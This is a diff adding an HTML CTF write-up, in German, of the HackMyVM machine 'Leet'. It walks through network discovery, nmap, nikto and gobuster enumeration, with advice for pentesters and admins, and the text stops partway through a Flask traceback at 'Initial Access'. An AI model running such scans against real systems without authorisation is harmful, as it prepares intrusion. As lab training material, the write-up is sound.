@@ -1,1 +1,1102 @@
-﻿﻿﻿<html><body><h1>Test-Inhalt für Leet - HackMyVM - Hard.html</h1></body></html>
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Leet - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+    <div class="header-bg">
+        <h1>Leet - HackMyVM - Level: Hard - Bericht</h1>
+        <div class="level-container">
+            <h2>Hard</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Hier die Liste der Tools als <div class="tool-item">Toolname</div> Elemente einfügen -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">nano</div>
+                <div class="tool-item">scp</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">micro</div>
+                <div class="tool-item">nc</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">cat</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Hier die Links zum Inhaltsverzeichnis als <li><a href="#id-der-section">Abschnittsname</a></li> Elemente einfügen -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <!-- Hier die Reconnaissance-Schritte einfügen, mit Kommentaren und Code-Blöcken. -->
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">arp-scan -l | grep "PCS" | awk '{print $1}'</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">192.168.2.44</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dieser Befehl ist ein klassischer erster Schritt im Reconnaissance-Prozess. Ich nutze <code>arp-scan</code>, um das lokale Netzwerk (identifiziert durch den Parameter <code>-l</code>) nach aktiven Geräten zu scannen. Die Ausgabe pipe ich dann an <code>grep "PCS"</code>, um die Ergebnisse nach Zeilen zu filtern, die die Zeichenkette "PCS" enthalten. Dies ist oft hilfreich, um Geräte basierend auf Herstellerinformationen oder vordefinierten Namen in der ARP-Tabelle zu identifizieren. Der gefundene Eintrag wird abschließend mittels <code>awk '{print $1}'</code> verarbeitet, um nur das erste Feld der gefilterten Zeile auszugeben, was in der Regel die IP-Adresse des gefundenen Systems ist. Für Laien: Ich durchsuche mein lokales Netzwerk nach Geräten und filtere die Ergebnisse, um die IP-Adresse eines bestimmten Geräts zu finden, das mit "PCS" in Verbindung gebracht wird (oft der Hersteller der Netzwerkarte). Für Experten: Die Kombination von Standard-Linux-Tools in einer Pipe ist eine effiziente Methode zur schnellen Extraktion spezifischer Informationen aus rohen Scan-Ergebnissen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Ergebnis liefert mir die IP-Adresse <code>192.168.2.44</code>. Dies ist ein entscheidender Erfolg, da ich nun einen konkreten Zielhost für weitere Scans und Enumeration habe. Die Methode über <code>arp-scan</code> und Filterung ist effektiv, um im lokalen Segment Hosts schnell zu identifizieren. Es zeigt, dass das Ziel im selben Netzwerksegment liegt wie mein Angreifer-System und aktiv ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die gefundene IP-Adresse ist nun das Hauptziel für detailliertere Scans (z.B. Portscanning mit Nmap). Ich werde diese IP als Basis für alle weiteren Interaktionen nutzen.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass nicht benötigte Geräte oder virtuelle Maschinen in sensiblen Netzwerksegmenten isoliert sind. Überprüfen Sie, welche Informationen über Geräte im lokalen Netzwerk über ARP-Tabellen öffentlich zugänglich sind. Grundlegend: Unbekannte oder verdächtige Geräte sollten im Netzwerk identifiziert und isoliert werden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">192.168.2.44   leet.hmv</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich editiere die Datei <code>/etc/hosts</code> auf meinem lokalen Kali-System mit dem Texteditor <code>vi</code>. Diese Datei ist eine einfache Textdatei, die IP-Adressen Hostnamen zuordnet. Indem ich den Eintrag <code>192.168.2.44 leet.hmv</code> hinzufüge, weise ich der IP-Adresse <code>192.168.2.44</code> den lokalen Hostnamen <code>leet.hmv</code> zu. Für Laien: Ich 'taufe' die IP-Adresse, die ich gefunden habe, lokal auf meinem Computer mit einem Namen (<code>leet.hmv</code>), damit ich sie später einfacher ansprechen kann, z.B. mit Befehlen wie <code>ping leet.hmv</code> statt <code>ping 192.168.2.44</code>. Für Experten: Das Hinzufügen eines Eintrags in <code>/etc/hosts</code> ist eine gängige Praxis, um die IP-Adresse eines Zielsystems mit einem aussagekräftigen Namen zu versehen, was die Lesbarkeit und Wartbarkeit von Befehlen und Skripten während des Pentests erheblich verbessert, insbesondere wenn man mit mehreren Hosts gleichzeitig arbeitet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das erfolgreiche Hinzufügen des Eintrags <code>192.168.2.44 leet.hmv</code> in <code>/etc/hosts</code> ist eine kleine, aber wichtige Vorbereitung. Es ermöglicht mir, im weiteren Verlauf des Berichts konsistent den Hostnamen <code>leet.hmv</code> zu verwenden, was den Bericht übersichtlicher macht und meine Schritte leichter nachvollziehbar gestaltet. Es hat keinen direkten Einfluss auf das Zielsystem, verbessert aber meine Arbeitsweise erheblich.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Diese Methode ist empfehlenswert für Hosts, mit denen intensiv interagiert wird. Stellen Sie sicher, dass der gewählte Hostname keine Konflikte mit existierenden Namen oder DNS-Einträgen im Testnetzwerk verursacht. Alternativ könnte man die IP direkt verwenden oder temporäre DNS-Einträge hinzufügen.<br><strong>Empfehlung (Admin):</strong> Dieses Vorgehen betrifft nur das Angreifer-System und hat keine Auswirkung auf die Sicherheit des Zielsystems. Es unterstreicht jedoch die Bedeutung einer sauberen Namensauflösung in Netzwerken.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sS -sC -sV -p- -T5 -AO 192.168.2.44 | grep open</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)</span>
+<span class="command">7777/tcp open  http    Werkzeug httpd 3.0.1 (Python 3.11.2)</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Hier führe ich einen umfangreichen Nmap-Scan gegen das Zielsystem <code>192.168.2.44</code> durch. Ich verwende eine Kombination von Flags: <code>-sS</code> für einen schnellen SYN-Scan (auch Stealth-Scan genannt), <code>-sC</code>, um Standard-Skripte zur Diensterkennung auszuführen, <code>-sV</code>, um detaillierte Versionsinformationen der offenen Dienste zu ermitteln, <code>-p-</code>, um alle 65535 TCP-Ports zu scannen, <code>-T5</code> für eine aggressive Timing-Vorlage (schnellstmöglich, ohne Rücksicht auf Stabilität), und <code>-AO</code> für OS-Erkennung. Die gesamte Ausgabe pipe ich dann an <code>grep open</code>, um nur die Zeilen anzuzeigen, die den Status "open" enthalten, was bedeutet, dass auf diesen Ports Dienste lauschen. Für Laien: Ich klopfe systematisch an alle virtuellen 'Türen' (Ports) des Zielcomputers, um herauszufinden, welche offen sind und welche Programme dahinter stecken. Das Ergebnis filtere ich so, dass ich nur die offenen Türen sehe. Für Experten: Die Kombination dieser Nmap-Flags liefert schnell einen umfassenden Überblick über die exponierten Dienste und deren Versionen, was kritisch für die Identifizierung potenzieller Angriffsvektoren ist. Das Aggressive Timing (<code>-T5</code>) kann jedoch in instabilen Umgebungen oder bei Intrusion Detection/Prevention Systems auffallen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Ergebnis des gefilterten Nmap-Scans ist sehr aufschlussreich. Es zeigt, dass nur zwei Ports geöffnet und für externe Verbindungen verfügbar sind: Port 22 mit einem SSH-Dienst (OpenSSH 9.2p1) und Port 7777 mit einem HTTP-Dienst (Werkzeug httpd 3.0.1, basierend auf Python 3.11.2). Die Tatsache, dass so wenige Ports offen sind, deutet auf eine gewisse Grundhärtung hin, was bei Systemen mit höherem Schwierigkeitsgrad üblich ist. Der HTTP-Dienst auf einem unüblichen Port (7777 statt 80 oder 443) ist besonders interessant und wird mein primäres Ziel für die weitere Enumeration sein.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde mich nun auf die Enumeration der gefundenen Dienste konzentrieren, insbesondere auf den HTTP-Dienst auf Port 7777. SSH auf Port 22 ist ein Standarddienst; hier werde ich versuchen, bekannte Schwachstellen in OpenSSH 9.2p1 zu prüfen und Brute-Force-Angriffe in Betracht ziehen, falls Anmeldedaten gefunden werden.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass nur absolut notwendige Dienste für externe Verbindungen geöffnet sind. Überprüfen Sie die Konfiguration des SSH-Dienstes (z.B. Deaktivierung von Root-Anmeldung, Verwendung von Schlüsselpaaren statt Passwörtern, Ratenbegrenzung) und des HTTP-Dienstes auf Port 7777. Halten Sie die Software (OpenSSH, Werkzeug/Python) aktuell, um bekannte Schwachstellen zu minimieren. Der nicht standardmäßige HTTP-Port 7777 bietet keine Sicherheit, solange der Dienst erreichbar ist.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sS -sC -sV -p- -T5 -AO 192.168.2.44</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-15 21:31 CEST</span>
+<span class="command">Nmap scan report for leet.hmv (192.168.2.44)</span>
+<span class="password">Host is up (0.00015s latency).</span>
+Not shown: <span class="command">65533 closed tcp ports (reset)</span>
+<span class="command">PORT     STATE SERVICE VERSION</span>
+<span class="command">22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)</span>
+<span class="command">| ssh-hostkey:</span>
+<span class="command">|   256 e1:5d:7c:b7:07:92:17:dc:46:76:7d:be:a9:50:43:d2 (ECDSA)</span>
+<span class="command">|_  256 a0:f3:b3:86:93:f5:58:82:88:dd:e5:10:db:35:de:62 (ED25519)</span>
+<span class="command">7777/tcp open  http    Werkzeug httpd 3.0.1 (Python 3.11.2)</span>
+<span class="command">|_http-title: Site doesn't have a title (text/html; charset=utf-8).</span>
+<span class="command">|_http-server-header: Werkzeug/3.0.1 Python/3.11.2</span>
+<span class="command">MAC Address: 08:00:27:8E:D7:37 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span>
+<span class="command">Device type: general purpose|router</span>
+<span class="command">Running: Linux 4.X|5.X, MikroTik RouterOS 7.X</span>
+<span class="command">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3</span>
+<span class="command">OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)</span>
+<span class="command">Network Distance: 1 hop</span>
+<span class="command">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span>
+
+TRACEROUTE
+HOP RTT     ADDRESS
+<span class="command">1   0.15 ms leet.hmv (192.168.2.44)</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dies ist die vollständige Ausgabe des zuvor ausgeführten Nmap-Scans, diesmal ohne Filterung per <code>grep</code>. Sie liefert mir alle Details, die Nmap erfassen konnte: die Nmap-Version und Startzeit, den Scan-Bericht für den Host, die Anzahl der geschlossenen Ports, die detaillierten Informationen zu den offenen Ports 22 (SSH) und 7777 (HTTP, Werkzeug), inklusive SSH-Hostkeys und HTTP-Header/Titelinformationen. Zusätzlich enthält die Ausgabe Informationen zur MAC-Adresse (oft Herstellerbezogen, hier Oracle VirtualBox), geschätzter Geräte- und OS-Typ (Linux Kernel 4.X/5.X), sowie TRACEROUTE-Informationen (hier nur ein Hop). Für Laien: Das ist der komplette 'Gesundheits-Check' des Zielcomputers, der nicht nur offene 'Türen' zeigt, sondern auch Details zu den 'Schlössern' (Dienste), dem 'Typ' des Computers (Betriebssystem) und wie viele 'Schritte' (Netzwerk-Hops) er von meinem Computer entfernt ist. Für Experten: Die vollständige Nmap-Ausgabe ist die definitive Quelle für gefundene Dienste, Versionen und Konfigurationsdetails (wie SSH-Hostkeys, HTTP-Header), die für die Identifizierung spezifischer Schwachstellen und die Planung von Exploits unerlässlich sind. OS-Erkennung (<code>-AO</code>) ist oft nicht 100% genau, liefert aber nützliche Hinweise auf die zugrundeliegende Plattform.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die vollständige Ausgabe bestätigt und erweitert die Ergebnisse des gefilterten Scans. Die identifizierten Versionen (OpenSSH 9.2p1, Werkzeug httpd 3.0.1, Python 3.11.2, Debian-Basis) sind präzise und ermöglichen gezielte Recherchen nach bekannten Schwachstellen (CVEs). Die HTTP-Header <code>Werkzeug/3.0.1 Python/3.11.2</code> sind sehr spezifisch und bestätigen die Technologie hinter dem Webserver auf Port 7777. Die MAC-Adresse <code>08:00:27:8E:D7:37</code> identifiziert das Ziel als virtuelle Maschine unter Oracle VirtualBox, was ein häufiges Szenario in CTFs und Testumgebungen ist. Die geschätzte OS-Familie (Linux) ist konsistent mit der SSH-Version und dem Python-Webserver. Die geringe Latenz und 1 Hop bestätigen die direkte Erreichbarkeit im lokalen Netz.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde die spezifischen Versionen der Software nun in Schwachstellen-Datenbanken (wie CVE Details, Exploit-DB) recherchieren. Die spezifischen HTTP-Header sind ein starker Indikator für die Technologie und sollten weiter analysiert werden, insbesondere im Kontext des ungewöhnlichen Ports 7777. Die VirtualBox-Erkennung ist nützlicher Kontext.<br><strong>Empfehlung (Admin):</strong> Eine genaue OS-Erkennung durch Tools wie Nmap kann durch restriktivere Firewall-Regeln oder die Deaktivierung bestimmter Nmap-freundlicher Protokolle erschwert werden. Die offen gelegten Software-Versionen erlauben einem Angreifer gezielte Angriffe. Stellen Sie sicher, dass unnötige Netzwerkadapter (wie die von VirtualBox exponierte) korrekt konfiguriert sind und keine ungewollten Informationen preisgeben.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -Iv "http://192.168.2.44:7777"</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">*   Trying 192.168.2.44:7777...</span>
+<span class="password">* Connected to 192.168.2.44 (192.168.2.44) port 7777</span>
+<span class="password">* using HTTP/1.x</span>
+<span class="command">> HEAD / HTTP/1.1</span>
+<span class="command">> Host: 192.168.2.44:7777</span>
+<span class="command">> User-Agent: curl/8.13.0</span>
+<span class="command">> Accept: */*</span>
+<span class="command">></span>
+<span class="password">* Request completely sent off</span>
+<span class="password">* HTTP 1.0, assume close after body</span>
+<span class="command">< HTTP/1.0 200 OK</span>
+<span class="command">HTTP/1.0 200 OK</span>
+<span class="command">< Server: Werkzeug/3.0.1 Python/3.11.2</span>
+<span class="command">Server: Werkzeug/3.0.1 Python/3.11.2</span>
+<span class="command">< Date: Sun, 15 Jun 2025 19:46:30 GMT</span>
+<span class="command">Date: Sun, 15 Jun 2025 19:46:30 GMT</span>
+<span class="command">< Content-Type: text/html; charset=utf-8</span>
+<span class="command">Content-Type: text/html; charset=utf-8</span>
+<span class="command">< Content-Length: 1234</span>
+<span class="command">Content-Length: 1234</span>
+<span class="command">< Connection: close</span>
+<span class="command">Connection: close</span>
+<span class="command"><</span>
+
+<span class="password">* shutting down connection #0</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich nutze <code>curl</code> mit den Flags <code>-I</code> (nur Header holen) und <code>-v</code> (verbose Ausgabe) gegen den HTTP-Dienst auf Port 7777 der Ziel-IP <code>192.168.2.44</code>. Anstatt die Standard-GET-Anfrage zu senden, sende ich eine HEAD-Anfrage (durch <code>-I</code> impliziert), die nur die Header-Informationen des Servers zurückgeben sollte, ohne den eigentlichen Inhalt der Seite herunterzuladen. Der <code>-v</code> Parameter zeigt die Details des Verbindungsprozesses und sowohl die gesendeten Anfragen als auch die empfangenen Antworten. Für Laien: Ich frage den Webserver auf Port 7777 ganz detailliert nach seiner 'Visitenkarte' (den Headern), ohne mir den Inhalt der 'Website' anzuschauen. Das hilft mir zu sehen, wie der Server auf eine einfache Anfrage reagiert und welche Basisinformationen er preisgibt. Für Experten: Eine <code>HEAD</code>-Anfrage ist nützlich, um Server-Header und Status-Codes zu prüfen, ohne unnötig Bandbreite zu verbrauchen oder Logs mit vollen GET-Anfragen zu füllen. Die Verbose-Ausgabe von <code>curl</code> gibt tieferen Einblick in den TLS-Handshake (falls HTTPS) und den gesamten Anfrage-/Antwortzyklus.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die <code>curl -Iv</code> Ausgabe bestätigt die Ergebnisse von Nmap bezüglich des HTTP-Dienstes: Der Server antwortet mit einem <code>HTTP/1.0 200 OK</code> Status, was bedeutet, dass der Dienst aktiv und erreichbar ist. Die Server-Header <code>Server: Werkzeug/3.0.1 Python/3.11.2</code> werden ebenfalls erneut bestätigt. Diese spezifischen Header sind besonders wertvoll, da sie die zugrundeliegende Web-Technologie eindeutig identifizieren. Die Bestätigung der Konnektivität und der Technologie-Stack auf Port 7777 macht diesen Dienst zum primären Ziel für die Web-Enumeration.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der nächste logische Schritt ist eine detaillierte Enumeration des Webservers auf Port 7777. Dazu gehören Verzeichnis-Brute-Forcing, die Suche nach bekannten Schwachstellen in Werkzeug/Python und die manuelle Analyse der Webanwendung selbst.<br><strong>Empfehlung (Admin):</strong> Minimieren Sie die Informationen, die Server-Header preisgeben (sog. 'Header Obfuscation' oder 'Server Signature Hiding'). Die exakte Version von Werkzeug und Python offenzulegen, erleichtert gezielte Angriffe, falls in diesen Versionen Schwachstellen bekannt sind. Konfigurieren Sie den Server so, dass er nur notwendige Header sendet.</p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nikto -h http://leet.hmv:7777</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">- Nikto v2.5.0</span>
+<span class="password">---------------------------------------------------------------------------</span>
+<span class="command">+ Target IP:          192.168.2.44</span>
+<span class="command">+ Target Hostname:    leet.hmv</span>
+<span class="command">+ Target Port:        7777</span>
+<span class="password">+ Start Time:         2025-06-15 21:32:10 (GMT2)</span>
+<span class="password">---------------------------------------------------------------------------</span>
+<span class="command">+ Server: Werkzeug/3.0.1 Python/3.11.2</span>
+<span class="password">+ /: The anti-clickjacking X-Frame-Options header is not present. See: [Link: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options | Ziel: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options]</span>
+<span class="password">+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: [Link: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/ | Ziel: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/]</span>
+<span class="command">+ No CGI Directories found (use '-C all' to force check all possible dirs)</span>
+<span class="command">+ OPTIONS: Allowed HTTP Methods: POST, GET, OPTIONS, HEAD .</span>
+<span class="password">+ /console: This might be interesting.</span>
+<span class="password">+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.</span>
+<span class="command">+ 7962 requests: 0 error(s) and 5 item(s) reported on remote host</span>
+<span class="password">+ End Time:           2025-06-15 21:32:24 (GMT2) (14 seconds)</span>
+<span class="password">---------------------------------------------------------------------------</span>
+<span class="command">+ 1 host(s) tested</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich setze das Tool <code>nikto</code> ein, einen weit verbreiteten Webserver-Scanner, um den HTTP-Dienst auf Port 7777 (Hostname <code>leet.hmv</code>) automatisiert auf bekannte Schwachstellen, Konfigurationsfehler und interessante Dateien/Pfade zu prüfen. Nikto führt eine Vielzahl von Tests durch, die über eine einfache Verzeichnis-Enumeration hinausgehen und spezifische Webserver-Schwachstellen, veraltete Software, potenziell gefährliche Dateien und Konfigurationsprobleme erkennen sollen. Für Laien: Nikto ist ein automatischer Detektiv, der die Website auf Port 7777 auf Hunderte von bekannten Problemen und versteckten Hinweisen untersucht, die ein Angreifer ausnutzen könnte. Für Experten: Nikto ist ein wertvolles Werkzeug für eine schnelle automatisierte Web-Sicherheitsprüfung, das oft erste Hinweise auf interessante Endpunkte (wie Admin-Panels, Testdateien) oder fehlende Sicherheits-Header liefert. Es ist jedoch ein 'Signature-Based'-Scanner und findet keine unbekannten Schwachstellen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Nikto-Ausgabe liefert mehrere wichtige Informationen. Erstens bestätigt sie erneut den Server (Werkzeug/Python). Zweitens identifiziert sie fehlende Sicherheits-Header (<code>X-Frame-Options</code>, <code>X-Content-Type-Options</code>), was auf eine potenziell unzureichende Härtung hinweist. Drittens listet sie die erlaubten HTTP-Methoden auf (<code>POST, GET, OPTIONS, HEAD</code>). Am wichtigsten sind jedoch die gefundenen 'interessanten' Pfade: <code>/console</code> (markiert als 'This might be interesting') und <code>/#wp-config.php#</code> (markiert als 'file found' und 'contains the credentials'). Die Referenz auf <code>wp-config.php</code> in einem Nicht-WordPress-Kontext (Werkzeug/Python) ist verdächtig und deutet auf eine mögliche Fehlkonfiguration oder einen Hinweis hin. Der <code>/console</code>-Pfad, insbesondere im Kontext von Python/Werkzeug, könnte auf eine interaktive Debugging-Konsole hindeuten, was eine kritische Schwachstelle wäre.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde die gefundenen Pfade <code>/console</code> und <code>/#wp-config.php#</code> umgehend manuell untersuchen. Die erlaubten HTTP-Methoden, insbesondere <code>OPTIONS</code> und möglicherweise <code>POST</code>, könnten ebenfalls relevant sein. Die fehlenden Sicherheits-Header sind eher ein Hinweis auf Konfigurationsmängel als ein direkter Angriffsvektor, sollten aber notiert werden.<br><strong>Empfehlung (Admin):</strong> Implementieren Sie essentielle Sicherheits-Header wie <code>X-Frame-Options</code>, <code>X-Content-Type-Options</code>, <code>Strict-Transport-Security</code> (falls HTTPS verwendet wird) und eine Content Security Policy (CSP), um gängige clientseitige Angriffe zu mitigieren. Stellen Sie sicher, dass keine Debug-Endpunkte wie <code>/console</code> in Produktionsumgebungen zugänglich sind. Überprüfen Sie das Vorhandensein und die Zugänglichkeit potenziell sensibler Dateien wie <code>#wp-config.php#</code> oder ähnliche Backup-Dateien.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">gobuster dir -u "http://leet.hmv:7777" -w "/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,svg,pem,crt,json,conf,ELF,elf,c,java,lib,cgi,csh,config,deb,desc,exp,eps,diff,icon,mod,ln,old,rpm,js.map,pHtml,yaml,bak -b '503,404,403' -e --no-error -k</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">===============================================================</span>
+<span class="command">Gobuster v3.6</span>
+<span class="command">by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)</span>
+<span class="password">===============================================================</span>
+<span class="command">[+] Url:                     http://leet.hmv:7777</span>
+<span class="command">[+] Method:                  GET</span>
+<span class="command">[+] Threads:                 10</span>
+<span class="command">[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span>
+<span class="command">[+] Negative Status codes:   503,404,403</span>
+<span class="command">[+] User Agent:              gobuster/3.6</span>
+<span class="command">[+] Extensions:              pl,png,config,xls,sh,kdbx,icon,zip,bak,conf,ELF,csh,html,pdf,deb,old,tar,crt,desc,js.map,doc,py,jpg,csv,dll,raw,txt,sql,bat,ps1,jpeg,ln,rar,asp,exe,pem,lib,rpm,diff,mod,php,mdb,xml,json,eps,pub,db,java,gz,c,pHtml,accdb,phtml,rtf,exp,elf,xlsx,aspx,cgi,docx,svg,yaml</span>
+<span class="command">[+] Expanded:                true</span>
+<span class="command">[+] Timeout:                 10s</span>
+<span class="password">===============================================================</span>
+<span class="password">Starting gobuster in directory enumeration mode</span>
+<span class="password">===============================================================</span>
+<span class="command">http://leet.hmv:7777/download             (Status: 500) [Size: 14478]</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich verwende <code>gobuster</code>, ein weiteres Tool zur Web-Enumeration, speziell zum Brute-Forcing von Verzeichnissen und Dateien auf dem Webserver. Ich ziele auf die URL <code>http://leet.hmv:7777</code> ab und nutze eine umfangreiche Wortliste (<code>directory-list-2.3-medium.txt</code> aus Seclists). Mit dem Parameter <code>-x</code> gebe ich eine sehr lange Liste von Dateierweiterungen an, nach denen gesucht werden soll, um auch spezifische Dateitypen zu finden (z.B. <code>.txt</code>, <code>.php</code>, <code>.sql</code>, <code>.py</code>, <code>.bak</code> etc.). Der Parameter <code>-b '503,404,403'</code> weist gobuster an, Seiten mit den Statuscodes 503 (Service Unavailable), 404 (Not Found) und 403 (Forbidden) als 'nicht gefunden' zu ignorieren. <code>-e</code> zeigt die vollständige URL an, <code>--no-error</code> unterdrückt Fehler, und <code>-k</code> ignoriert SSL/TLS-Zertifikatsfehler (hier nicht direkt relevant, da HTTP). Für Laien: Ich lasse ein Programm systematisch Tausende von möglichen Namen für Webseiten-Ordner und -Dateien ausprobieren, kombiniert mit vielen verschiedenen Endungen (wie .html, .php, .txt), um versteckte Pfade auf der Website zu finden. Dabei ignoriere ich bestimmte Fehlermeldungen, um die Ergebnisse sauberer zu halten. Für Experten: Gobuster ist oft schneller und flexibler als dirb/dirbuster. Die Verwendung einer großen Wortliste in Kombination mit vielen Extensions erhöht die Chance, versteckte Ressourcen zu finden. Das Filtern von Statuscodes ist essentiell, um falsch positive Ergebnisse zu vermeiden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Gobuster findet nur einen einzigen Pfad mit einem interessanten Statuscode, der nicht auf der Ignorierliste steht: <code>/download</code> mit dem Status <code>500 (Internal Server Error)</code> und einer beträchtlichen Größe (<code>[Size: 14478]</code>). Während ein 500er Fehler normalerweise auf ein Problem auf Serverseite hindeutet, ist die Tatsache, dass dieser spezifische Pfad diesen Fehler zurückgibt, bemerkenswert. Es deutet darauf hin, dass der Endpunkt existiert, aber ein Fehler auftritt, wenn er ohne erwartete Parameter aufgerufen wird. Dies ist ein starker Hinweis darauf, dass <code>/download</code> ein funktionaler Endpunkt ist, der eine bestimmte Eingabe erwartet.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der <code>/download</code>-Endpunkt muss manuell untersucht werden. Die Tatsache, dass er einen 500er Fehler bei einfachem Aufruf zurückgibt, legt nahe, dass er Parameter erwartet. Ich werde versuchen, verschiedene Parameter und Werte an diesen Endpunkt zu senden, um sein Verhalten zu verstehen und den Fehler zu umgehen oder auszunutzen. Die Größe der Antwort (~14KB) bei einem Fehler ist ebenfalls verdächtig.<br><strong>Empfehlung (Admin):</strong> Webserver-Logs sollten kontinuierlich überwacht werden, um ungewöhnliche Anfragen und Fehler (wie die 500er Fehler auf <code>/download</code>) zu erkennen. Interne Server-Fehler können ungewollt Informationen über die Server-Konfiguration oder den Quellcode preisgeben. Stellen Sie sicher, dass Endpunkte, die Parameter erwarten, klare Fehlermeldungen für Endbenutzer liefern, aber keine internen Details offenlegen.</p>
+        </section>
+		        <section id="initial-access">
+            <h2>Initial Access</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <pre>
+http://leet.hmv:7777/download
+
+
+<span class="password">ValueError</span>
+
+<span class="password">ValueError: Parameter 'filename' invalid or missing.</span>
+Traceback (most recent call last)
+
+    File "/opt/project/venv/lib/python3.11/site-packages/flask/app.py", line 1488, in __call__
+
+    return self.wsgi_app(environ, start_response)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
